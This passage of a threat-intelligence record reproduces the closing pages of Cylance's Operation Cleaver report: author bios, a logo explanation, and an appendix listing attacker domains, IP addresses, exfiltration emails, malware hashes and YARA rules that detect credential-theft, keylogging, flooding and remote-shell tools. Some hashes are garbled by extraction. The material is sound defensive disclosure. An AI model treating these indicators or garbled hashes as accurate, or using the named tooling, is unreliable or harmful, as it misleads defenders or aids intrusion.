sale malware panels.\n\n**Stuart McClure**\nStuart is founder, CEO/President and Chairman of Cylance. Widely recognized for his extensive and\nin-depth knowledge of security products, Stuart McClure is considered one of the industry’s leading\nauthorities in information security today. A well-published and acclaimed security visionary with\ncurrently eleven books in print, McClure is the originating founder of the Hacking Exposed series\nof books, the most successful security book ever written. From his work, he founded Foundstone in\nOctober of 1999 which sold to McAfee in 2004.\n\n\nMcClure brings over two decades of technology and executive leadership with profound technical,\noperational, and financial experience. Besides Foundstone, Stuart held leadership positions at\nInfoWorld, Ernst & Young, Kaiser Permanente and a number of government agencies. At McAfee,\nMcClure held numerous positions including SVP/General Manager for the Security Management BU\nas well as EVP/Global Chief Technology Officer responsible for almost $3B worth of revenues.\nToday, McClure is CEO of Cylance, a disruptive and innovative startup applying math to the problem\nof security. Cylance products such as CylancePROTECT prevent the most advanced attacks in the\nworld without signatures or sandboxing in realtime on the endpoint. Cylance Services offer highly\nspecialized security services such as incident response, forensics, compromise assessments and\nadvanced penetration assessments for global critical infrastructure.\n\n**Cylance Team**\nCylance employees work passionately and tirelessly every day to achieve one goal: Protect the\nworld from cyber attacks. And with their efforts in tracking Operation Cleaver, they have achieved\nthat goal. Our endless thanks to all the Cylancers who contributed to this report.\n\n\n-----\n\n##### CLEAVER\n\n\n##### THE OPERATION CLEAVER LOGO\n\nThe Operation Cleaver logo, created by Cylance specifically for this report, was inspired by the\ninfamous logo used by the Army of the Guardians of the Islamic Revolution, also known in the\nwest as the Iranian Revolutionary Guard Corps (IRGC). Due to the close connection between the\nmembers tracked in this report and the IRGC, it was only fitting to replicate the look and feel of the\nIRGC’s iconography as the anchor for this document’s branding.\n\n\n7\n\n\n###### Army of the Guardians of the Islamic Republic (IRGC)\n\nThe striking visual elements that make up the logo\nof the IRGC have very specific meanings:\n\n\n###### Operation Cleaver\n\nSeveral of the visual elements present in the IRGC\nlogo have been carried over to the Operation Cleaver\nlogo including:\n\n\n\n- The clenched fist holding a rifle, most likely an\nAK-47, represents armed resistance.\n\n- The globe symbolizes the IRGC’s worldwide\nambitions.\n\n- The book, from which the clenched first\nemanates, represents the Qur’an, connecting\nthe religious ideals on which the group was\nfounded to the armed struggle.\n\n- The plants, possibly wheat, represent\nprosperity.\n\n- The name of the group in Persian, the year in\nwhich it was founded and a passage from the\nQur’an (8:60) ‘And make ready against them all\nyou can of power’, are represented in text.\n\n\n\n- A clenched fist, this time holding a cleaver,\nrepresents the group’s likely connection with the\nIRGC as well as armed resistence in general.\n\n- The globe in the background represents\nOperation Cleaver’s worldwide reach.\n\n- An ethernet cable connected to the clenched first\nrepresents the nature of these attacks (cyber as\nopposed to traditional warfare).\n\n- The hex string translates to “Think Evil, Do Good”,\na mantra our research team lives by.\n\n\n-----\n\n## APPENDIX A:\n##### INDICATORS OF COMPROMISE\n\n###### 7\n\n\n###### #OPCLEAVER\n\n\n-----\n\n##### CLEAVER\n\n\n###### Indicators of Compromise (IOC)\n\nThis Appendix details the IOCs discovered in the investigation of Operation Cleaver.\n**CylancePROTECT prevents the malware used in Operation Cleaver from ever executing.**\n\n\n###### Domains\n```\ndoosan-job(dot)com\ndownloadsservers(dot)com\ndrivercenterupdate(dot)com\neasyresumecreatorpro(dot)com\ngoogleproductupdate(dot)com\ngoogleproductupdate(dot)net\n\n```\nkundenpflege.menrad(dot)de\n```\nmicrosoftactiveservices(dot)com\nmicrosoftmiddleast(dot)com\nmicrosoftonlineupdates(dot)com\nmicrosoftserverupdate(dot)com\nmicrosoftupdateserver(dot)net\nmicrosoftwindowsresources(dot)com\nmicrosoftwindowsupdate(dot)net\nnorthropgrumman(dot)net\nteledyne-jobs(dot)com\nwindowscentralupdate(dot)com\nwindowssecurityupdate(dot)com\nwindowsserverupdate(dot)com\nwindowsupdateserver(dot)com\nwww.gesunddurchsjahr(dot)de\n\n```\n\n###### Email Addresses Used for Domain Registration\n\n```\ndavejsmith200(at)outlook.com\nsalman.ghazikhani(at)outlook.com\nbtr.8624(at)yahoo.com\nghanbarianco(at)gmail.com\nazlinux73(at)gmail.com\ndomain(at)netafraz.com\n\n```\n```\ntarh.andishan(at)yahoo.com\nahmadi(at)odeconline.com\nkafe0(at)yahoo.com\ndg_co(at)yahoo.com\nzahiry_alireza(at)yahoo.com\nzahiry.alireza(at)gmail.com\n\n```\n\n-----\n\n###### #OPCLEAVER\n\n\n###### Email Addresses Used for Exfiltration\n```\ntestmail_00001(at)yahoo.com\n\n```\nTerafficAnalyzer(at)yahoo.com\n```\ndyanachear(at)beyondsys.com\n\n```\n\n###### IP Addresses\n```\n50.23.164.161\n64.120.128.154\n64.120.208.74\n64.120.208.75\n64.120.208.76\n64.120.208.78\n64.120.208.154\n66.96.252.198\n78.109.194.114\n80.243.182.149\n87.98.167.71\n87.98.167.85\n87.98.167.141\n88.150.214.162\n88.150.214.166\n88.150.214.168\n88.150.214.170\n\n```\n```\n95.211.191.225\n95.211.191.247\n95.211.241.249\n95.211.241.251\n108.175.152.230\n\n###### 7\n108.175.153.158\n159.253.144.209\n173.192.144.68\n174.36.195.158\n184.82.158.18\n184.82.181.48\n188.227.180.213\n192.111.145.197\n203.150.224.249\n207.182.142.68\n212.87.154.12\n212.87.154.14\n\n```\n\n###### Mutexes\n```\nZSC1\nAdobe Report Service\nBmgr\n\n```\n\n###### Dynamic Mutexes\n\nThese mutexes are used with the process ID of the malware as a suffix:\n\n```\ndemdaramdidam\nILoveThisMutex\n\n```\n\n-----\n\n##### CLEAVER\n\n\n###### Installed Services Names\n```\nCOM+ System Extentions\nCOM__System_Extentions\nNetwork Connectivity Manager\nService1\nMsNetMonitor\nPcapins\nscManagerSvc\nCredentialSync\nAdobe Report Service\n\n```\n\n###### Samples (MD5)\nListed below are both the MD5 and SHA-256 hashes for samples related to Operation Cleaver.\n```\n01606d42c64e4d15ea07d4e1fbd0c40d\n0405adfc8739025ba88c746c8edebfb8\n04fdf5b757764af8bc7ef88e0f8fe8c1\n0512c5a8807e4fdeb662e61d81cd1645\n0593352cadb2789c19c2660e02b2648b\n08eabb6164b1b12307931e4f2d95f7c6\n0900c3319e4c46ff9478e3e1fa9528a1\n0acd8945bd162e5e7aa982cddbd8ecaa\n0ad6a01a916f14fc24fa43e46813b3bb\n0b2cbfa07fa9a090b35a3dfdb0ebad9d\n0b80a8d2c56789b4bda9a56a53e7e2b1\n0f4b526d8edf1d3d32c81a692c325733\n10d019932fc43e9b39be709f8281203d\n1223e93dd4a5ad0536c8232936cb35fe\n144064951cceaf1bb81e8f215de76101\n14a80287490f3a68d99c0f518b246fd2\n17d1f25185b31044eb89a99d50d36a26\n18942a44d2b5f2bbf54e2c18ac293915\n18efd3f66d23c5c555e128a19de63667\n19d9b37d3acf3468887a4d41bf70e9aa\n1c2bc564805695dbb3a26d9c9f7dffea\n1c7e40443e36c4b7592617f0a271835d\n1d8fd8c357907a79f3e6d9f831f2bd7d\n21829130d5e2a69b0f6963c68b070127\n2e36a3f3b888c1fd3c3aa3f1ba7969ad\n30120cf30ea4d870635893cd75338f97\n304f7f17031af90012d4e4d1cc5cfb8a\n336b501bd96e309f93c8d12960634248\n38998ff6f9a3874b6943d7ac837d19c3\n\n```\n\n-----\n\n###### #OPCLEAVER\n\n\n###### Samples (MD5) cont.\n```\n3b6260ead85b4f0d706203e062a34a21\n41eeae4158152f49ab64601c4358a7a1\n42714874f86fa9bd97e9be460d7d72c0\n42e459d1d057bd937e0d00958e591f08\n48dd515e2b148493cf47b0c0c5713573\n491f031d0a9ad4919cb29cb2d9a9a65c\n4e483762f555b078976a1ddf3fc3e532\n53230e7d5739091a6eb51298a50eb616\n537b42d3cd9812e5b583131b83a48508\n53841511791e4cac6f0768a9eb5def8a\n54def27d598b75f297a8cf2c97150997\n5837ad676f6c0f0f4f48096648d6e81b\n5a4046fd0825641766b197a2132d24107\n5e5d6469b270aa60dc90ddfde32ba082\n5eef1ee37714c9ee07653419890010d6\n6061410c04b9fa9e47593611a02ff2dd\n6094f64d54575a2d5a3fbd2d23c4f44e\n61896424e995476b23f73a5c1c34af5e\n61e307a651a7bbce78eb48c1d395501a\n636c2d2855ac8a8693c4ef9e89c67205\n641fc6831d8c215e9645cf5d4a8be5e5\n68cfc418c72b58b770bdccf19805703e\n69d80a27ab0c85ef073badbee7ec55c7\n69f9705ecdcc709506f7665ad373c1a0\n6cd5f1982693f2ce21effddf18f5baf5\n6d4d21258eef96979ce6f2417c6c019f\n6ef950941d114c09af359402620d7cba\n735cdf3a3e9c06d88de31112782ef831\n736aab6c731d098931d6a4bf11a8150e\n758f2557922e360bff3d1565e6871ea1\n765f3db4421bdf8bb953dffe37398453\n78a63bc8433cea162e31a5865d5817c9\n836ef6b06c5fd52ecc910a3e3408004a\n84384d77ac9835720375943235d33a87\n855239a2434a3bc78751d9ba9cfac900\n8994e16b14cde144a9cebdff685d8676\n9376e5b754ccd94f7c66b811d81e240e\n948c570269059928517f155b4b6db1a4\n94ef4f98b9c321f74778811f64c68d03\n96e372dea573714d34e394550059b1d7\n9838f7ead2023061eb79587243910daa\n985e86ac1854585d2771fd173b63b98b\n\n```\n\n-----\n\n##### CLEAVER\n\n\n###### Samples (MD5) cont.\n```\n9a48bee62c41c0640e9564cc37f718bf\n9bcb8091ba414a38bfb7a39eccf3f6bc\n9e00a52caec6385e0ab1e21e9794a5b0\n9ef9ec11c9f83dde38556feaf88b2a29\n9feee6fe54ee4ec859f7bad0d798ac4e\nad94daecadbac8a54e81a69cacc41441\nad99db10c0c12eaea09b39568a761b52\nadf77661a409b5a1304d08b62a1264f5\naf58d803b2e0b5d0f194c25ff85a8d81\nafdfafb2c1e2af1a48e833da8f35bb83\nb163fcda16d8fe860a906f768ef27bc8\nb2d78ecce135e008adc3e80915f69798\nb3d5e1ff7a7ff10cd738b215f92d1ad5\nb7ddb09bdc0d0eb39c364d9b9d6436cc\nbaa76a571329cdc4d7e98c398d80450c\nbd9fbbbd7dab62ed6a56d00f21c4c67e\nbe6273ebd472a2a499a6c1e48ae81112\nbe741520f13a2bf8bc064a73e146bf08\nbfc59f1f442686af73704eff6c0226f0\nc1b5464c0506bea6cf778dd18fa456cc\nc440ec0a8cf7341b746160a684c51741\nc5282f088b90de1ab758424b152d34ac\nc91887d861d9bd4a5872249b641bc9f9\ncb52f84d462ac67bde53eec40128408c\ncbe05db979444589211e830487df7610\nd000071a6bf49da390fef8f12aa9e3f8\nd84c3d678f269a0c6beb22ed266efac0\nde56ca66423fc5e42808445f2b5631d3\nde56ca66423fc5e42808445f2b5631d3\nde744bcb7c63b035b6c5c3ec0279c3ac\ne0f6c5fdde04fbf8cd1a42f75cb06248\ne4c9e8f28894e89d6270ad6a4c6cd064\ne4e5f1efe44ac06bc3672fd1d8f85630\ne5428bcae8b4e84cb5186ad5c83ffc98\ne7428dec7deb041692d6575e069c1cf0\ne8b1f23616f9d8493e8a1bf0ca0f512a\ne8ea10d5cde2e8661e9512fb684c4c98\neac61634da4513a10b596e6c8c299126\neb48c318e8fd9a2a7a18da6578db05d6\nf1301bad6da06f436e3a3de0244848e1\nf3d80d813dc6a239d921169c57c5789d\nf 7 9 78 d 0f3bb9ff8 827d5b 9ff\n\n```\n\n-----\n\n###### #OPCLEAVER\n\n\n###### Samples (SHA-256)\n```\n039ce41fb40a27a46c43bf7ef7d1b08cd5e3f6d71ec08e140cd9166247e783af\n0510efd8eae869cd0773a033d5a46d6b7f0162174019e54618887f3085312fcb\n064e47074342a6e026de068adaf48c41b2ec2c341c7514768cb7b39425905524\n08065f658d65773e583e9ca784148117d87be3a5005a0871cbc4446f42ed5040\n0ce968ea8cffb6312f6d17af9044a14f79d6427b9038bcfc6212acb5aa23e74b\n0d1f479842cd5bde4f18ab8c85a099da39e13a4051a7c21334e33d55b6f18d76\n0fee562cd821f53e864e02b00a59780aed63abca9f7502678fca9bf47b8b12bd\n10647c4e7b1b741aeaea9b16d8eb5dae3237ce00dc69f6843790767a277b6204\n10cf7a186897243363278cf0283a1687749d9ba43fa713b9f974050f56e97cca\n15121b7cbd15143fc0118e06ebe70b7dc1e239b21d865b2c750ed8a0f1f00ef2\n1578a4c641f0c7913cdf08267d1a88ac384d586c453b922670be380b7e67a179\n1698d8168e860c3377646b12444d38a2e6aebba5a499504a5fc0a73b91d894071756ba79cd63458a50df86203380824ea855c8d6bf1c673e05a13a62f14cd1707\n1aa25a930e8bae5abbe75907c335c7d1d875b60f72f02855a8d37daadc6b469f\n1efad3bce90ac1d2011ba686f1ab0e435b9a709763fb238dbcad0f44acddccbe\n20dddd8651a26161139b49dfabfb3b4b743c57fcc982afc11d1c5c4264a2a8be\n2a13730f8f16e04cece490eee53bbdcc9bd1e01fbbc2a758562a6462d9473742\n2db6f74a8aef9fe86aef5dff3334e8dd252ac45e26b4a12e8641a770bbb08b45\n2e32c6c9179750df7f1ab35536f09c6b09c73faccea7325fe5c79b5087f5dd6f\n32aa8f19e452a1471640cd7be72f806e1997fd5a1a2b2743898ee4cd0aed0dc5\n37af3f3b3c43690a2e73d4b5edb968896ec4da7b2c21b12a94e146a10f07fef8\n39ba1710545fc9e123abbbce61bda1b00525e59346570a3f8c36f7adde5bb47e\n3a7ebd7f502fd3f6b3b88693b1123147621b4030c21df9e0690864e8969e149a\n3bdbf591fa0d81606929fdf6abe44ba6e185dd8fc0fa62ade8afde48f704d11a\n3d18e18ae97045cc3198026ddc681e7d957a25402b79141a3c6fdc18bb879ad6\n3fa302449da1e4fad81143cc48fc80034cbc41804f00e00ac17bdb7dba0b992d\n42ca980b7fc7892716a923c7bf3ff6a76ce81f81bd0a83bea40a1735f33b36b8\n45a2ea5226c1ce11e8955c99d5b58fd3baa66fb53436be63cb099e96ef30db43\n48437fe7d7d0c5fbde340e1392662f7fc421fc05d7c9824f71160475105ad999\n4f131095ba56f6d3621a007985ac758d780b0c837f554f6e44d535ed55d33af1\n508c7691d535102538aaa6dce32d750c2492dada36506a390c1959f261a0244b\n50d11ad32eb72b128185a0aecf39be8085b6b1a8f30cb41d8bc177a1ff8f3067\n550a33353730579a7d2b9276cc3b66ca252a59e198285c732fcda46513351c03\n5ac9f4e25ef4002274496e18ea537b4c582a3acf3126cc1830a63941d9c91e64\n5d1e81f5a4fca25b7afb18eb906c9a53965d81dcf62f9d91499baf03229a8de8\n5fb4ae33cac8b2b74e63fc639eeb969a660ef9a7e8310c2769acc925122f047e\n616a25378f70474bcb3ad0fad2f1383009c5b7b3cea937be2a5234a110d64b78\n634685e43e9f73343cb337ec64a8679485e1ddb4c2de5ecb6a5746aa5ddb1b72\n6474f74340e7199919e7532c6756cf459cd20c3391852d80b058eb7997a31e9f\n650f143ac0a668536b6750a628ec51e7ca28f5520105eeb87308f557cd74e63c\n65509837e15b6a914b611c2d5066ba06ded39b0bed288552e65df20610e35976\n\n```\n\n-----\n\n##### CLEAVER\n\n\n###### Samples (SHA-256) cont.\n```\n65509837e15b6a914b611c2d5066ba06ded39b0bed288552e65df20610e35976\n67a2b9c32653161fafaea231b6661d9d797bb0964c79c9ee46cf2bf76571ed45\n6888723e56f2e7696ac1e1910f68a1d54d7c76e9eb8e69554980b04e881e0e86\n7199acca3d851889efa4a5a42b3f55010f4916294201ce5ad20c76898200ffa9\n75b77606175ee696395f1b0e6850d5cd6596e34f74804b30c9bf9e368ebcd299\n7890a726603edcd70b6e6f3de367cf891131d833d14c506b26e07935a715048f\n79ca080a152bd44f9b07af0f940c303e45e10d516633384f5b3d34a29d0d03c8\n7b9fd4b9b36cf84fcbcb3e9bf589d8a51c2166558baf462ab312929fbb584642\n80ed4e7a242ee3d1c2656affb04cd56e7262e5a6bf2bec2f8435aa3f47c9b5d1\n8129345ce66643d880a3e01e607399279dec7bf9cadc06d9b26134f6d205ed06\n8813bd0b4ad6c6155b571c9c1fbcabfeed3812ab8fbd9acd8372385094aaa565\n8f02dfd900760cb2c84e4f5a859512f5d719daae063a719c956cbf6185004da5\n8f9a45ba73c67ba9c4958ea49508c350a0e1c3caf476ccab2fb8cb3049e3ba46\n902f2391b1075e14985bc91316c98cdcf3442ecaeb3ef12422813f946ab8409e\n9801f7c552cbcf8c413dade920b96be2eaad9624ba4adaf17f80f815dac58974\n9aec3f14ec69e9942a7d3075bb5479dc5fa61e6c2a03cbee1a9269264efac51c\n9ba06cb9dcd05e6866ee0e9ecc0c9a480d5b6c8d177ef1907d7fcc02e2871806\n9ebbd300ddf70bccbecfe3bf47898e5959cfc090cef8716e2e638d840a24007b\na321158d7f5be572ac5536ad57cb4a312bea52430b03da9dda97f4548a080bc3\naa23c55bed562cbf47c84092d0a35b0da35e3db3982a18a28fb45ca70ac6b399\naa7ac2a053ceba819fcd1c8b273db64296c2754a8101291870e142519c416b1b\nabb0ebd57cf2b0d54cd2b01fd9b11ccd9ed68053174d131922811a9ad22459ea\nac272bd9701c5d9cb7e8d1a4e2a191a894e98aa463fb17628c52da16612627d8\nad06e03fdd9eff480ca623ea23ec87c794d99ae6dda308c979fa5173b2b8a514\nad5fbf8e381d92225aa6c022e2bbc175be0e33138b5fa4bbb508b970b33bbc1e\nad71283aadb2455f7a1cd4e8283c789599c33d328da44965f6c282f2e600e1b2\naebac79b820891510b9e14ef97892875bf4197797ca91aef149acdc1e6bf6a7c\naf8deedc78097c387926bb95ebd6ab2a870349794f452f35f84132b0dbe12e09\nb18f80a02d45eaed618993447c82916ad8802e552dddccf733a3698794d8cb9d\nb275caf4cbc4f47b3d772886172438b81a2e11ff5a8683be488de4b219b39070\nb42ef5f39aaf6e52ff4e0510b6e5c3fb5c84bf35befcde8bcc18dc86bccbdfb4\nb49706b7d5432a368070ee58aa8776cce1ddc2098e863b1b7b36d7b7d79fe6a9\nb4d4c421bc70e5a3345d4b8c9d1090ff16ff82870bd38216bb8bac7f1088dafb\nb99cddd428e78ede109c7bd3683c374ac6010a15c0633939511e39c1ed99f621\nbb2b135c7a9b366ec7090404761a9ee9e7c03c56d68165a6789a29e804104068\nbe4cc2d1504002107a77bb943ad2d22c205cdcc6ad4804c0440970e5e922d30d\nbf7746d29330b666d82b153989d41406305572b92f6b24a1f1adef6374b58328\nbfa66edd0d9ae2c8179893ee881f479b37dce0ce8220a8a18e1b42a879ddff4a\nc11a244cba9da30173ff1dcb755a377c3b2b1f99cd15a887041937b086113ebd\nc1c1e5b43b1ac9af79aafa59a6062468142afc2278b6fea0bb4dbbb83af65d06\n\n```\n\n-----\n\n###### #OPCLEAVER\n\n\n###### Samples (SHA-256) cont.\n```\nc30a2fe22050dcac30616a3d27d5c92ea2815d060b365747984913758a209aaa\nc74df42cfc7c7221f7f28c67bd726a1caad8453fc35daddfb094aaeede2e8e1e\nc9010e060de6a83c3802ed4e6b7f544e6eb2b5420ee2be5c71646e6a27182bea\nc901d84878f50a93ab76f2ea31763bebb0acf0c0f9ad86b3abf98e5cde499332\nc99fa90038cec60d9aa21a49e537ad9ea55672ed78cf5b429cb4c75ebc5ccd69\nc9fc8133e755c14cb02872ba05a2332baefe5e94797479aded46c3db83a7cc14\nca7138bfe08b480386653072482e58f6c48b05a1e7fb8a82cc042806eae9acc2\ncaa769a21bf97987de4cc92874eaa03e7b0538082c502606aa8ca97823e2e2aa\ncd75664edea18e3aa303763e6f6c639b3e90ead4b51c2b3e41c808e3d968c848\ncffba2a145d91bdecfa8cb32af6964576889faa04591b503a58507cf89ab7cae\nd045ea925cf461da5c58cc2af8a0f96ec7c961ea62ffcf1de0b04abf9b0fa8ac\nd11b504b18bc8615e98f3c37d98c6fe11216a0f070a056414ca4407fc298fbd6\n\n 7\nd3c2488d321ca6760986fc1a55a3c1db3f7b215fc2883d7e4fabc2871b5a27ac\nd4e54c1bc1efba20d75861c01bb2cc053b1ab9fadae29bf6c4c04528110056e6\nd5d1fa5b5474089e59c05ca88a96257d4449d852b429c620aa773408bd48d067\nd8c7aef47bac024188d929e749e90ac172fd51b8f6e16dec4b6635dc2ffa85ef\ndc21a2189f9e2d63872c0b5ee7ec75316799c60eb018ba9b98398b69efe45365\ndc22e4b5ef752d3ec47d7bb3de7534e4a2daa2642de8c9839ad262d33a7aa7dc\ne180f933aad709883acde441ee64407d49fa4183ae5130480005a0e81a0de491\ne250bce96e5f0c162dbe4d87a1a7d65deb910f59c0bea1140897c22eb9dca501\ne2e9d60c76225db77668440ff698eacef48b544ffab1ae0c641dcedb5ad570bd\ne339c7b77113f1a1c4c2f7e307b785cc4fc9145663fe3a612079240efcc9ac93\ne3b38627d9e94a7e084e12cbd2acf7e66ce90021972061f8b9b61316eddb3bd6\ne401340020688cdd0f5051b7553815eee6bc04a5a962900883f1b3676bf1de53\ne4d43cd20d4ea59f68c26d46c30e1819cac5b9552d27fce826b0855494018267\ne509843b2c061fa5e6ea7d11554bb22f36e6b79b7cd5cc0639ff63d48ce66336\ned85c3f8d2cccbb6a0ec2b4b27b158b4dbc6885245081901dd51eb2266f4b2bf\nee33dd17802ca906fcc68815ff2a7d12ac7fab7f1c272a56444e4fd6715a6227\neea0dcabaabef075081e23fc91b84e07042117bb0362e59f11b17338108d0c1b\nf7e1a74e08c5718de9edc57facc26dda97ae5b723420a06ef56f1f6f8aa6fb5a\nfbc531e83359310e2940ffff180a26e28d55396710c748e2ae7e64357273a09d\nfd4a9af7ba67f794a83a720539666e89f288686a432b5c7133033a2ebde266cc\n\n Public/Private Key Fingerprints\n\n```\n0A:E1:AE:85:6A:BB:D5:87:BF:8E:21:4E:92:E6:1F:8C\n70:70:2F:11:2B:01:03:4A:70:D9:5E:11:CC:E9:7A:16\n6F:DB:BB:BA:DA:7F:FA:4B:3F:A1:C3:46:5E:4B:8F:31:E8:31:F1:EC\n78:BE:02:06:B3:1E:57:DF:62:4E:30:16:ED:AA:5C:56:F7:E8:11:62\n\n\n-----\n\n##### CLEAVER\n\n\n###### YARA Signatures\n\nrule BackDoorLogger\n```\n{\n strings:\n\n```\n$s1 = “BackDoorLogger”\n$s2 = “zhuAddress”\n```\n condition:\n  all of them\n}\n\n```\n```\nrule Jasus\n{\n strings:\n\n```\n$s1 = “pcap_dump_open”\n$s2 = “Resolving IPs to poison...”\n$s3 = “WARNNING: Gateway IP can not be found”\n```\n condition:\n  all of them\n}\nrule LoggerModule\n{\n strings:\n\n```\n$s1 = “%s-%02d%02d%02d%02d%02d.r”\n$s2 = “C:\\\\Users\\\\%s\\\\AppData\\\\Cookies\\\\”\n```\n condition:\n  all of them\n}\n\n```\n```\nrule NetC\n{\n strings:\n\n```\n$s1 = “NetC.exe” wide\n$s2 = “Net Service”\n```\n condition:\n  all of them\n}\nrule ShellCreator2\n{\n strings:\n\n```\n$s1 = “ShellCreator2.Properties”\n$s2 = “set_IV”\n```\n condition:\n  all of them\n}\n\n```\n\n-----\n\n###### #OPCLEAVER\n\n\n###### YARA Signatures (cont.)\n```\nrule SmartCopy2\n{\n strings:\n\n```\n$s1 = “SmartCopy2.Properties”\n$s2 = “ZhuFrameWork”\n```\n condition:\n  all of them\n}\n\n```\n\nrule SynFlooder\n```\n{\n strings:\n\n```\n$s1 = “Unable to resolve [ %s ]. ErrorCode %d”\n$s2 = “your target’s IP is : %s”\n\n###### 7\n\n$s3 = “Raw TCP Socket Created successfully.”\n```\n condition:\n  all of them\n}\nrule TinyZBot\n{\n strings:\n\n```\n$s1 = “NetScp” wide\n$s2 = “TinyZBot.Properties.Resources.resources”\n\n\n$s3 = “Aoao WaterMark”\n$s4 = “Run_a_exe”\n$s5 = “netscp.exe”\n\n$s6 = “get_MainModule_WebReference_DefaultWS”\n$s7 = “remove_CheckFileMD5Completed”\n$s8 = “http://tempuri.org/”\n\n\n$s9 = “Zhoupin_Cleaver”\n```\n condition:\n\n```\n($s1 and $s2) or ($s3 and $s4 and $s5) or ($s6 and $s7 and $s8) or\n$s9)\n```\n}\nrule ZhoupinExploitCrew\n{\n strings:\n\n```\n$s1 = “zhoupin exploit crew” nocase\n$s2 = “zhopin exploit crew” nocase\n```\n condition:\n  1 of them\n}\n\n```\n\n-----\n\n##### CLEAVER\n\n\n###### YARA Signatures (cont.)\n```\nrule antivirusdetector\n{\n    strings:\n\n```\n$s1 = “getShadyProcess”\n$s2 = “getSystemAntiviruses”\n$s3 = “AntiVirusDetector”\n```\n    condition:\n       all of them\n\n```\n```\n}\nrule csext\n{\n strings:\n\n```\n$s1 = “COM+ System Extentions”\n$s2 = “csext.exe”\n$s3 = “COM_Extentions_bin”\n```\n condition:\n  all of them\n}\n\n```\n```\nrule kagent\n{\n strings:\n\n```\n$s1 = “kill command is in last machine, going back”\n$s2 = “message data length in B64: %d Bytes”\n```\n condition:\n  all of them\n}\nrule mimikatzWrapper\n{\n strings:\n\n```\n$s1 = “mimikatzWrapper”\n$s2 = “get_mimikatz”\n```\n condition:\n  all of them\n}\n\n```\n```\nrule pvz_in\n{\n strings:\n\n```\n$s1 = “LAST_TIME=00/00/0000:00:00PM$”\n$s2 = “if %%ERRORLEVEL%% == 1 GOTO line”\n```\n condition:\n  all of them\n}\n\n```\n\n-----\n\n###### #OPCLEAVER\n\n\n###### YARA Signatures (cont.)\n```\nrule pvz_out\n{\n strings:\n\n```\n$s1 = “Network Connectivity Module” wide\n$s2 = “OSPPSVC” wide\n```\n condition:\n  all of them\n}\n\n```\n```\nrule wndTest\n{\n strings:\n\n```\n$s1 = “[Alt]” wide\n$s2 = “<< %s >>:” wide\n\n###### 7\n\n$s3 = “Content-Disposition: inline; comp=%s; account=%s; product=%d;”\n```\n condition:\n  all of them\n}\nrule zhCat\n{\n strings:\n\n```\n$s1 = “zhCat -l -h -tp 1234”\n$s2 = “ABC ( A Big Company )” wide\n```\n condition:\n  all of them\n}\n\n```\n```\nrule zhLookUp\n{\n strings:\n\n```\n$s1 = “zhLookUp.Properties”\n```\n condition:\n  all of them\n}\nrule zhmimikatz\n{\n strings:\n\n```\n$s1 = “MimikatzRunner”\n$s2 = “zhmimikatz”\n```\n condition:\n  all of them\n}\n\n```\n\n-----\n\n##### CLEAVER\n\n\n###### 7\n\n\n###### #OPCLEAVER\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2014/2014.12.02.Operation_Cleaver/Cylance_Operation_Cleaver_Report.pdf"
    ],
    "report_names": [
        "Cylance_Operation_Cleaver_Report"
    ],
    "threat_actors": [
        {
            "id": "42a6a29d-6b98-4fd6-a742-a45a0306c7b0",
            "created_at": "2022-10-25T15:50:23.710403Z",
            "updated_at": "2025-03-27T02:00:55.531313Z",
            "deleted_at": null,
            "main_name": "Silence",
            "aliases": [
                "Whisper Spider"
            ],
            "source_name": "MITRE:Silence",
            "tools": [
                "Winexe",
                "SDelete"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "c91e335e-42be-48d9-96b5-ba56749a723b",
            "created_at": "2022-10-25T16:07:23.458346Z",
            "updated_at": "2025-03-27T02:02:09.813395Z",
            "deleted_at": null,
            "main_name": "CIA",
            "aliases": [
                "Central Intelligence Agency"
            ],
            "source_name": "ETDA:CIA",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8e1bae2f-2a21-4ba8-a6f1-42155f96aec8",
            "created_at": "2022-10-25T16:07:23.645758Z",
            "updated_at": "2025-03-27T02:02:09.905135Z",
            "deleted_at": null,
            "main_name": "Flying Kitten",
            "aliases": [
                "Ajax Security Team",
                "Flying Kitten",
                "Group 26",
                "Operation Saffron Rose"
            ],
            "source_name": "ETDA:Flying Kitten",
            "tools": [
                "Stealer"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "e034b94b-9655-42c4-a72e-a58807dce299",
            "created_at": "2022-10-25T16:07:24.133537Z",
            "updated_at": "2025-03-27T02:02:10.118581Z",
            "deleted_at": null,
            "main_name": "Rocket Kitten",
            "aliases": [
                "Group 83",
                "NewsBeef",
                "Newscaster",
                "Operation Newscaster",
                "Operation Woolen-GoldFish",
                "Parastoo",
                "Rocket Kitten"
            ],
            "source_name": "ETDA:Rocket Kitten",
            "tools": [
                "CoreImpact (Modified)",
                "FireMalv",
                "Ghole",
                "Gholee"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "88e53203-891a-46f8-9ced-81d874a271c4",
            "created_at": "2022-10-25T16:07:24.191982Z",
            "updated_at": "2025-03-27T02:02:10.13692Z",
            "deleted_at": null,
            "main_name": "Silence",
            "aliases": [
                "ATK 86",
                "Contract Crew",
                "TAG-CR8",
                "TEMP.TruthTeller",
                "Whisper Spider"
            ],
            "source_name": "ETDA:Silence",
            "tools": [
                "EDA",
                "EmpireDNSAgent",
                "Farse",
                "Ivoke",
                "Kikothac",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Meterpreter",
                "ProxyBot",
                "ReconModule",
                "Silence.Downloader",
                "TiniMet",
                "TinyMet",
                "TrueBot",
                "xfs-disp.exe"
            ],
